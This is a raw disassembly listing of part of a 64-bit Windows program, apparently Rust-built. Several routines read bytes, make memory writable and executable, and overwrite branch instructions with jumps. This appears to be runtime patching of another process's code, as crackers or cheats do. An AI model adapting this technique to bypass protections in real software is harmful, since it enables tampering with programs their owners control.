   1400045a0:	8a 45 e8             	mov    -0x18(%rbp),%al
   1400045a3:	0f b6 4d f7          	movzbl -0x9(%rbp),%ecx
   1400045a7:	c1 e1 10             	shl    $0x10,%ecx
   1400045aa:	0f b7 5d f5          	movzwl -0xb(%rbp),%ebx
   1400045ae:	09 cb                	or     %ecx,%ebx
   1400045b0:	48 c1 e3 20          	shl    $0x20,%rbx
   1400045b4:	8b 55 f1             	mov    -0xf(%rbp),%edx
   1400045b7:	48 09 da             	or     %rbx,%rdx
   1400045ba:	48 8b 4d e9          	mov    -0x17(%rbp),%rcx
   1400045be:	48 0f a4 ca 08       	shld   $0x8,%rcx,%rdx
   1400045c3:	48 c1 e1 08          	shl    $0x8,%rcx
   1400045c7:	0f b6 c0             	movzbl %al,%eax
   1400045ca:	48 09 c8             	or     %rcx,%rax
   1400045cd:	48 83 c4 50          	add    $0x50,%rsp
   1400045d1:	5b                   	pop    %rbx
   1400045d2:	5f                   	pop    %rdi
   1400045d3:	5e                   	pop    %rsi
   1400045d4:	41 5e                	pop    %r14
   1400045d6:	5d                   	pop    %rbp
   1400045d7:	c3                   	ret
   1400045d8:	4c 8d 05 11 d5 01 00 	lea    0x1d511(%rip),%r8        # 0x140021af0
   1400045df:	48 89 f2             	mov    %rsi,%rdx
   1400045e2:	e8 59 b5 01 00       	call   0x14001fb40
   1400045e7:	0f 0b                	ud2
   1400045e9:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400045ee:	ba 08 00 00 00       	mov    $0x8,%edx
   1400045f3:	e8 18 b3 01 00       	call   0x14001f910
   1400045f8:	0f 0b                	ud2
   1400045fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004600:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004605:	55                   	push   %rbp
   140004606:	41 56                	push   %r14
   140004608:	56                   	push   %rsi
   140004609:	57                   	push   %rdi
   14000460a:	53                   	push   %rbx
   14000460b:	48 83 ec 20          	sub    $0x20,%rsp
   14000460f:	48 8d 6a 50          	lea    0x50(%rdx),%rbp
   140004613:	83 7d e0 01          	cmpl   $0x1,-0x20(%rbp)
   140004617:	75 09                	jne    0x140004622
   140004619:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   14000461d:	e8 4e 00 00 00       	call   0x140004670
   140004622:	90                   	nop
   140004623:	48 83 c4 20          	add    $0x20,%rsp
   140004627:	5b                   	pop    %rbx
   140004628:	5f                   	pop    %rdi
   140004629:	5e                   	pop    %rsi
   14000462a:	41 5e                	pop    %r14
   14000462c:	5d                   	pop    %rbp
   14000462d:	c3                   	ret
   14000462e:	66 90                	xchg   %ax,%ax
   140004630:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004635:	55                   	push   %rbp
   140004636:	41 56                	push   %r14
   140004638:	56                   	push   %rsi
   140004639:	57                   	push   %rdi
   14000463a:	53                   	push   %rbx
   14000463b:	48 83 ec 20          	sub    $0x20,%rsp
   14000463f:	48 8d 6a 50          	lea    0x50(%rdx),%rbp
   140004643:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004647:	48 8b 08             	mov    (%rax),%rcx
   14000464a:	48 8b 50 08          	mov    0x8(%rax),%rdx
   14000464e:	e8 dd ca ff ff       	call   0x140001130
   140004653:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140004657:	e8 c4 ca ff ff       	call   0x140001120
   14000465c:	90                   	nop
   14000465d:	48 83 c4 20          	add    $0x20,%rsp
   140004661:	5b                   	pop    %rbx
   140004662:	5f                   	pop    %rdi
   140004663:	5e                   	pop    %rsi
   140004664:	41 5e                	pop    %r14
   140004666:	5d                   	pop    %rbp
   140004667:	c3                   	ret
   140004668:	cc                   	int3
   140004669:	cc                   	int3
   14000466a:	cc                   	int3
   14000466b:	cc                   	int3
   14000466c:	cc                   	int3
   14000466d:	cc                   	int3
   14000466e:	cc                   	int3
   14000466f:	cc                   	int3
   140004670:	55                   	push   %rbp
   140004671:	48 83 ec 40          	sub    $0x40,%rsp
   140004675:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000467a:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   140004681:	ff 
   140004682:	80 39 02             	cmpb   $0x2,(%rcx)
   140004685:	73 06                	jae    0x14000468d
   140004687:	48 83 c4 40          	add    $0x40,%rsp
   14000468b:	5d                   	pop    %rbp
   14000468c:	c3                   	ret
   14000468d:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140004691:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140004695:	48 8b 08             	mov    (%rax),%rcx
   140004698:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000469c:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400046a0:	ff 10                	call   *(%rax)
   1400046a2:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400046a6:	48 8b 41 08          	mov    0x8(%rcx),%rax
   1400046aa:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400046ae:	48 85 d2             	test   %rdx,%rdx
   1400046b1:	74 0c                	je     0x1400046bf
   1400046b3:	48 8b 09             	mov    (%rcx),%rcx
   1400046b6:	4c 8b 40 10          	mov    0x10(%rax),%r8
   1400046ba:	e8 61 07 00 00       	call   0x140004e20
   1400046bf:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400046c3:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400046c7:	ba 18 00 00 00       	mov    $0x18,%edx
   1400046cc:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400046d2:	48 83 c4 40          	add    $0x40,%rsp
   1400046d6:	5d                   	pop    %rbp
   1400046d7:	e9 44 07 00 00       	jmp    0x140004e20
   1400046dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400046e0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400046e5:	55                   	push   %rbp
   1400046e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400046ea:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   1400046ee:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400046f2:	48 8b 08             	mov    (%rax),%rcx
   1400046f5:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400046f9:	e8 32 ca ff ff       	call   0x140001130
   1400046fe:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140004702:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140004706:	e8 15 ca ff ff       	call   0x140001120
   14000470b:	90                   	nop
   14000470c:	48 83 c4 20          	add    $0x20,%rsp
   140004710:	5d                   	pop    %rbp
   140004711:	c3                   	ret
   140004712:	cc                   	int3
   140004713:	cc                   	int3
   140004714:	cc                   	int3
   140004715:	cc                   	int3
   140004716:	cc                   	int3
   140004717:	cc                   	int3
   140004718:	cc                   	int3
   140004719:	cc                   	int3
   14000471a:	cc                   	int3
   14000471b:	cc                   	int3
   14000471c:	cc                   	int3
   14000471d:	cc                   	int3
   14000471e:	cc                   	int3
   14000471f:	cc                   	int3
   140004720:	41 57                	push   %r15
   140004722:	41 56                	push   %r14
   140004724:	41 55                	push   %r13
   140004726:	41 54                	push   %r12
   140004728:	56                   	push   %rsi
   140004729:	57                   	push   %rdi
   14000472a:	55                   	push   %rbp
   14000472b:	53                   	push   %rbx
   14000472c:	48 83 ec 48          	sub    $0x48,%rsp
   140004730:	49 8b 41 10          	mov    0x10(%r9),%rax
   140004734:	48 83 f8 03          	cmp    $0x3,%rax
   140004738:	0f 86 b8 01 00 00    	jbe    0x1400048f6
   14000473e:	49 89 cf             	mov    %rcx,%r15
   140004741:	49 8b 38             	mov    (%r8),%rdi
   140004744:	4d 8b 29             	mov    (%r9),%r13
   140004747:	48 8b 1a             	mov    (%rdx),%rbx
   14000474a:	49 8b 75 18          	mov    0x18(%r13),%rsi
   14000474e:	48 01 fe             	add    %rdi,%rsi
   140004751:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004756:	48 8b 01             	mov    (%rcx),%rax
   140004759:	44 8b 70 05          	mov    0x5(%rax),%r14d
   14000475d:	0f b7 68 09          	movzwl 0x9(%rax),%ebp
   140004761:	66 c7 44 24 2c 00 00 	movw   $0x0,0x2c(%rsp)
   140004768:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   14000476f:	00 
   140004770:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004777:	00 00 
   140004779:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   14000477e:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140004784:	48 89 d9             	mov    %rbx,%rcx
   140004787:	48 89 f2             	mov    %rsi,%rdx
   14000478a:	e8 e3 9f 01 00       	call   0x14001e772
   14000478f:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140004793:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004798:	44 8b 64 24 2c       	mov    0x2c(%rsp),%r12d
   14000479d:	66 89 6c 24 2c       	mov    %bp,0x2c(%rsp)
   1400047a2:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400047a7:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   1400047ae:	00 
   1400047af:	48 8d 6c 24 34       	lea    0x34(%rsp),%rbp
   1400047b4:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400047b9:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400047bf:	48 89 d9             	mov    %rbx,%rcx
   1400047c2:	48 89 f2             	mov    %rsi,%rdx
   1400047c5:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   1400047cb:	e8 96 9f 01 00       	call   0x14001e766
   1400047d0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400047d7:	00 00 
   1400047d9:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   1400047df:	48 89 d9             	mov    %rbx,%rcx
   1400047e2:	48 89 f2             	mov    %rsi,%rdx
   1400047e5:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   1400047ea:	e8 7d 9f 01 00       	call   0x14001e76c
   1400047ef:	44 8b 4c 24 34       	mov    0x34(%rsp),%r9d
   1400047f4:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400047f9:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400047ff:	48 89 d9             	mov    %rbx,%rcx
   140004802:	48 89 f2             	mov    %rsi,%rdx
   140004805:	e8 5c 9f 01 00       	call   0x14001e766
   14000480a:	49 8b 07             	mov    (%r15),%rax
   14000480d:	66 44 89 60 09       	mov    %r12w,0x9(%rax)
   140004812:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004817:	89 48 05             	mov    %ecx,0x5(%rax)
   14000481a:	48 83 7c 24 40 04    	cmpq   $0x4,0x40(%rsp)
   140004820:	0f 84 e6 00 00 00    	je     0x14000490c
   140004826:	49 03 7d 20          	add    0x20(%r13),%rdi
   14000482a:	49 8b 07             	mov    (%r15),%rax
   14000482d:	8b 68 0b             	mov    0xb(%rax),%ebp
   140004830:	0f b7 70 0f          	movzwl 0xf(%rax),%esi
   140004834:	66 c7 44 24 2c 00 00 	movw   $0x0,0x2c(%rsp)
   14000483b:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140004842:	00 
   140004843:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000484a:	00 00 
   14000484c:	4c 8d 74 24 28       	lea    0x28(%rsp),%r14
   140004851:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140004857:	48 89 d9             	mov    %rbx,%rcx
   14000485a:	48 89 fa             	mov    %rdi,%rdx
   14000485d:	4d 89 f0             	mov    %r14,%r8
   140004860:	e8 0d 9f 01 00       	call   0x14001e772
   140004865:	44 8b 64 24 28       	mov    0x28(%rsp),%r12d
   14000486a:	44 8b 6c 24 2c       	mov    0x2c(%rsp),%r13d
   14000486f:	66 89 74 24 2c       	mov    %si,0x2c(%rsp)
   140004874:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140004878:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   14000487f:	00 
   140004880:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   140004885:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000488a:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004890:	48 89 d9             	mov    %rbx,%rcx
   140004893:	48 89 fa             	mov    %rdi,%rdx
   140004896:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   14000489c:	e8 c5 9e 01 00       	call   0x14001e766
   1400048a1:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400048a8:	00 00 
   1400048aa:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   1400048b0:	48 89 d9             	mov    %rbx,%rcx
   1400048b3:	48 89 fa             	mov    %rdi,%rdx
   1400048b6:	4d 89 f0             	mov    %r14,%r8
   1400048b9:	e8 ae 9e 01 00       	call   0x14001e76c
   1400048be:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   1400048c3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400048c8:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400048ce:	48 89 d9             	mov    %rbx,%rcx
   1400048d1:	48 89 fa             	mov    %rdi,%rdx
   1400048d4:	e8 8d 9e 01 00       	call   0x14001e766
   1400048d9:	49 8b 07             	mov    (%r15),%rax
   1400048dc:	66 44 89 68 0f       	mov    %r13w,0xf(%rax)
   1400048e1:	44 89 60 0b          	mov    %r12d,0xb(%rax)
   1400048e5:	48 83 c4 48          	add    $0x48,%rsp
   1400048e9:	5b                   	pop    %rbx
   1400048ea:	5d                   	pop    %rbp
   1400048eb:	5f                   	pop    %rdi
   1400048ec:	5e                   	pop    %rsi
   1400048ed:	41 5c                	pop    %r12
   1400048ef:	41 5d                	pop    %r13
   1400048f1:	41 5e                	pop    %r14
   1400048f3:	41 5f                	pop    %r15
   1400048f5:	c3                   	ret
   1400048f6:	4c 8d 05 3b d2 01 00 	lea    0x1d23b(%rip),%r8        # 0x140021b38
   1400048fd:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004902:	48 89 c2             	mov    %rax,%rdx
   140004905:	e8 76 b1 01 00       	call   0x14001fa80
   14000490a:	0f 0b                	ud2
   14000490c:	4c 8d 05 3d d2 01 00 	lea    0x1d23d(%rip),%r8        # 0x140021b50
   140004913:	b9 04 00 00 00       	mov    $0x4,%ecx
   140004918:	ba 04 00 00 00       	mov    $0x4,%edx
   14000491d:	e8 5e b1 01 00       	call   0x14001fa80
   140004922:	0f 0b                	ud2
   140004924:	cc                   	int3
   140004925:	cc                   	int3
   140004926:	cc                   	int3
   140004927:	cc                   	int3
   140004928:	cc                   	int3
   140004929:	cc                   	int3
   14000492a:	cc                   	int3
   14000492b:	cc                   	int3
   14000492c:	cc                   	int3
   14000492d:	cc                   	int3
   14000492e:	cc                   	int3
   14000492f:	cc                   	int3
   140004930:	41 57                	push   %r15
   140004932:	41 56                	push   %r14
   140004934:	41 55                	push   %r13
   140004936:	41 54                	push   %r12
   140004938:	56                   	push   %rsi
   140004939:	57                   	push   %rdi
   14000493a:	55                   	push   %rbp
   14000493b:	53                   	push   %rbx
   14000493c:	48 83 ec 48          	sub    $0x48,%rsp
   140004940:	49 8b 41 10          	mov    0x10(%r9),%rax
   140004944:	48 83 f8 03          	cmp    $0x3,%rax
   140004948:	0f 86 b8 01 00 00    	jbe    0x140004b06
   14000494e:	49 89 cf             	mov    %rcx,%r15
   140004951:	49 8b 38             	mov    (%r8),%rdi
   140004954:	4d 8b 29             	mov    (%r9),%r13
   140004957:	48 8b 1a             	mov    (%rdx),%rbx
   14000495a:	49 8b 75 18          	mov    0x18(%r13),%rsi
   14000495e:	48 01 fe             	add    %rdi,%rsi
   140004961:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004966:	48 8b 01             	mov    (%rcx),%rax
   140004969:	44 8b 70 05          	mov    0x5(%rax),%r14d
   14000496d:	0f b7 68 09          	movzwl 0x9(%rax),%ebp
   140004971:	66 c7 44 24 2c 00 00 	movw   $0x0,0x2c(%rsp)
   140004978:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   14000497f:	00 
   140004980:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004987:	00 00 
   140004989:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   14000498e:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140004994:	48 89 d9             	mov    %rbx,%rcx
   140004997:	48 89 f2             	mov    %rsi,%rdx
   14000499a:	e8 d3 9d 01 00       	call   0x14001e772
   14000499f:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1400049a3:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400049a8:	44 8b 64 24 2c       	mov    0x2c(%rsp),%r12d
   1400049ad:	66 89 6c 24 2c       	mov    %bp,0x2c(%rsp)
   1400049b2:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400049b7:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   1400049be:	00 
   1400049bf:	48 8d 6c 24 34       	lea    0x34(%rsp),%rbp
   1400049c4:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400049c9:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400049cf:	48 89 d9             	mov    %rbx,%rcx
   1400049d2:	48 89 f2             	mov    %rsi,%rdx
   1400049d5:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   1400049db:	e8 86 9d 01 00       	call   0x14001e766
   1400049e0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400049e7:	00 00 
   1400049e9:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   1400049ef:	48 89 d9             	mov    %rbx,%rcx
   1400049f2:	48 89 f2             	mov    %rsi,%rdx
   1400049f5:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   1400049fa:	e8 6d 9d 01 00       	call   0x14001e76c
   1400049ff:	44 8b 4c 24 34       	mov    0x34(%rsp),%r9d
   140004a04:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140004a09:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004a0f:	48 89 d9             	mov    %rbx,%rcx
   140004a12:	48 89 f2             	mov    %rsi,%rdx
   140004a15:	e8 4c 9d 01 00       	call   0x14001e766
   140004a1a:	49 8b 07             	mov    (%r15),%rax
   140004a1d:	66 44 89 60 09       	mov    %r12w,0x9(%rax)
   140004a22:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004a27:	89 48 05             	mov    %ecx,0x5(%rax)
   140004a2a:	48 83 7c 24 40 04    	cmpq   $0x4,0x40(%rsp)
   140004a30:	0f 84 e6 00 00 00    	je     0x140004b1c
   140004a36:	49 03 7d 20          	add    0x20(%r13),%rdi
   140004a3a:	49 8b 07             	mov    (%r15),%rax
   140004a3d:	8b 68 0b             	mov    0xb(%rax),%ebp
   140004a40:	0f b7 70 0f          	movzwl 0xf(%rax),%esi
   140004a44:	66 c7 44 24 2c 00 00 	movw   $0x0,0x2c(%rsp)
   140004a4b:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140004a52:	00 
   140004a53:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004a5a:	00 00 
   140004a5c:	4c 8d 74 24 28       	lea    0x28(%rsp),%r14
   140004a61:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140004a67:	48 89 d9             	mov    %rbx,%rcx
   140004a6a:	48 89 fa             	mov    %rdi,%rdx
   140004a6d:	4d 89 f0             	mov    %r14,%r8
   140004a70:	e8 fd 9c 01 00       	call   0x14001e772
   140004a75:	44 8b 64 24 28       	mov    0x28(%rsp),%r12d
   140004a7a:	44 8b 6c 24 2c       	mov    0x2c(%rsp),%r13d
   140004a7f:	66 89 74 24 2c       	mov    %si,0x2c(%rsp)
   140004a84:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140004a88:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140004a8f:	00 
   140004a90:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   140004a95:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004a9a:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004aa0:	48 89 d9             	mov    %rbx,%rcx
   140004aa3:	48 89 fa             	mov    %rdi,%rdx
   140004aa6:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140004aac:	e8 b5 9c 01 00       	call   0x14001e766
   140004ab1:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004ab8:	00 00 
   140004aba:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140004ac0:	48 89 d9             	mov    %rbx,%rcx
   140004ac3:	48 89 fa             	mov    %rdi,%rdx
   140004ac6:	4d 89 f0             	mov    %r14,%r8
   140004ac9:	e8 9e 9c 01 00       	call   0x14001e76c
   140004ace:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   140004ad3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004ad8:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004ade:	48 89 d9             	mov    %rbx,%rcx
   140004ae1:	48 89 fa             	mov    %rdi,%rdx
   140004ae4:	e8 7d 9c 01 00       	call   0x14001e766
   140004ae9:	49 8b 07             	mov    (%r15),%rax
   140004aec:	66 44 89 68 0f       	mov    %r13w,0xf(%rax)
   140004af1:	44 89 60 0b          	mov    %r12d,0xb(%rax)
   140004af5:	48 83 c4 48          	add    $0x48,%rsp
   140004af9:	5b                   	pop    %rbx
   140004afa:	5d                   	pop    %rbp
   140004afb:	5f                   	pop    %rdi
   140004afc:	5e                   	pop    %rsi
   140004afd:	41 5c                	pop    %r12
   140004aff:	41 5d                	pop    %r13
   140004b01:	41 5e                	pop    %r14
   140004b03:	41 5f                	pop    %r15
   140004b05:	c3                   	ret
   140004b06:	4c 8d 05 5b d0 01 00 	lea    0x1d05b(%rip),%r8        # 0x140021b68
   140004b0d:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004b12:	48 89 c2             	mov    %rax,%rdx
   140004b15:	e8 66 af 01 00       	call   0x14001fa80
   140004b1a:	0f 0b                	ud2
   140004b1c:	4c 8d 05 5d d0 01 00 	lea    0x1d05d(%rip),%r8        # 0x140021b80
   140004b23:	b9 04 00 00 00       	mov    $0x4,%ecx
   140004b28:	ba 04 00 00 00       	mov    $0x4,%edx
   140004b2d:	e8 4e af 01 00       	call   0x14001fa80
   140004b32:	0f 0b                	ud2
   140004b34:	cc                   	int3
   140004b35:	cc                   	int3
   140004b36:	cc                   	int3
   140004b37:	cc                   	int3
   140004b38:	cc                   	int3
   140004b39:	cc                   	int3
   140004b3a:	cc                   	int3
   140004b3b:	cc                   	int3
   140004b3c:	cc                   	int3
   140004b3d:	cc                   	int3
   140004b3e:	cc                   	int3
   140004b3f:	cc                   	int3
   140004b40:	41 57                	push   %r15
   140004b42:	41 56                	push   %r14
   140004b44:	41 54                	push   %r12
   140004b46:	56                   	push   %rsi
   140004b47:	57                   	push   %rdi
   140004b48:	53                   	push   %rbx
   140004b49:	48 83 ec 38          	sub    $0x38,%rsp
   140004b4d:	4d 8b 71 10          	mov    0x10(%r9),%r14
   140004b51:	4d 85 f6             	test   %r14,%r14
   140004b54:	0f 84 fe 00 00 00    	je     0x140004c58
   140004b5a:	49 8b 30             	mov    (%r8),%rsi
   140004b5d:	4d 8b 39             	mov    (%r9),%r15
   140004b60:	48 8b 3a             	mov    (%rdx),%rdi
   140004b63:	49 8b 1f             	mov    (%r15),%rbx
   140004b66:	48 01 f3             	add    %rsi,%rbx
   140004b69:	66 c7 44 24 2e 90 e9 	movw   $0xe990,0x2e(%rsp)
   140004b70:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   140004b77:	00 
   140004b78:	4c 8d 64 24 34       	lea    0x34(%rsp),%r12
   140004b7d:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140004b82:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004b88:	48 89 f9             	mov    %rdi,%rcx
   140004b8b:	48 89 da             	mov    %rbx,%rdx
   140004b8e:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140004b94:	e8 cd 9b 01 00       	call   0x14001e766
   140004b99:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004ba0:	00 00 
   140004ba2:	4c 8d 44 24 2e       	lea    0x2e(%rsp),%r8
   140004ba7:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140004bad:	48 89 f9             	mov    %rdi,%rcx
   140004bb0:	48 89 da             	mov    %rbx,%rdx
   140004bb3:	e8 b4 9b 01 00       	call   0x14001e76c
   140004bb8:	44 8b 4c 24 34       	mov    0x34(%rsp),%r9d
   140004bbd:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140004bc2:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004bc8:	48 89 f9             	mov    %rdi,%rcx
   140004bcb:	48 89 da             	mov    %rbx,%rdx
   140004bce:	e8 93 9b 01 00       	call   0x14001e766
   140004bd3:	49 83 fe 01          	cmp    $0x1,%r14
   140004bd7:	0f 84 8d 00 00 00    	je     0x140004c6a
   140004bdd:	49 03 77 08          	add    0x8(%r15),%rsi
   140004be1:	c6 44 24 2d eb       	movb   $0xeb,0x2d(%rsp)
   140004be6:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140004bed:	00 
   140004bee:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   140004bf3:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004bf8:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004bfe:	48 89 f9             	mov    %rdi,%rcx
   140004c01:	48 89 f2             	mov    %rsi,%rdx
   140004c04:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140004c0a:	e8 57 9b 01 00       	call   0x14001e766
   140004c0f:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004c16:	00 00 
   140004c18:	4c 8d 44 24 2d       	lea    0x2d(%rsp),%r8
   140004c1d:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004c23:	48 89 f9             	mov    %rdi,%rcx
   140004c26:	48 89 f2             	mov    %rsi,%rdx
   140004c29:	e8 3e 9b 01 00       	call   0x14001e76c
   140004c2e:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   140004c33:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004c38:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004c3e:	48 89 f9             	mov    %rdi,%rcx
   140004c41:	48 89 f2             	mov    %rsi,%rdx
   140004c44:	e8 1d 9b 01 00       	call   0x14001e766
   140004c49:	90                   	nop
   140004c4a:	48 83 c4 38          	add    $0x38,%rsp
   140004c4e:	5b                   	pop    %rbx
   140004c4f:	5f                   	pop    %rdi
   140004c50:	5e                   	pop    %rsi
   140004c51:	41 5c                	pop    %r12
   140004c53:	41 5e                	pop    %r14
   140004c55:	41 5f                	pop    %r15
   140004c57:	c3                   	ret
   140004c58:	4c 8d 05 51 cf 01 00 	lea    0x1cf51(%rip),%r8        # 0x140021bb0
   140004c5f:	31 c9                	xor    %ecx,%ecx
   140004c61:	31 d2                	xor    %edx,%edx
   140004c63:	e8 18 ae 01 00       	call   0x14001fa80
   140004c68:	0f 0b                	ud2
   140004c6a:	4c 8d 05 57 cf 01 00 	lea    0x1cf57(%rip),%r8        # 0x140021bc8
   140004c71:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c76:	ba 01 00 00 00       	mov    $0x1,%edx
   140004c7b:	e8 00 ae 01 00       	call   0x14001fa80
   140004c80:	0f 0b                	ud2
   140004c82:	cc                   	int3
   140004c83:	cc                   	int3
   140004c84:	cc                   	int3
   140004c85:	cc                   	int3
   140004c86:	cc                   	int3
   140004c87:	cc                   	int3
   140004c88:	cc                   	int3
   140004c89:	cc                   	int3
   140004c8a:	cc                   	int3
   140004c8b:	cc                   	int3
   140004c8c:	cc                   	int3
   140004c8d:	cc                   	int3
   140004c8e:	cc                   	int3
   140004c8f:	cc                   	int3
   140004c90:	41 57                	push   %r15
   140004c92:	41 56                	push   %r14
   140004c94:	41 54                	push   %r12
   140004c96:	56                   	push   %rsi
   140004c97:	57                   	push   %rdi
   140004c98:	53                   	push   %rbx
   140004c99:	48 83 ec 38          	sub    $0x38,%rsp
   140004c9d:	4d 8b 71 10          	mov    0x10(%r9),%r14
   140004ca1:	4d 85 f6             	test   %r14,%r14
   140004ca4:	0f 84 fe 00 00 00    	je     0x140004da8
   140004caa:	49 8b 30             	mov    (%r8),%rsi
   140004cad:	4d 8b 39             	mov    (%r9),%r15
   140004cb0:	48 8b 3a             	mov    (%rdx),%rdi
   140004cb3:	49 8b 1f             	mov    (%r15),%rbx
   140004cb6:	48 01 f3             	add    %rsi,%rbx
   140004cb9:	66 c7 44 24 2e 0f 85 	movw   $0x850f,0x2e(%rsp)
   140004cc0:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   140004cc7:	00 
   140004cc8:	4c 8d 64 24 34       	lea    0x34(%rsp),%r12
   140004ccd:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140004cd2:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004cd8:	48 89 f9             	mov    %rdi,%rcx
   140004cdb:	48 89 da             	mov    %rbx,%rdx
   140004cde:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140004ce4:	e8 7d 9a 01 00       	call   0x14001e766
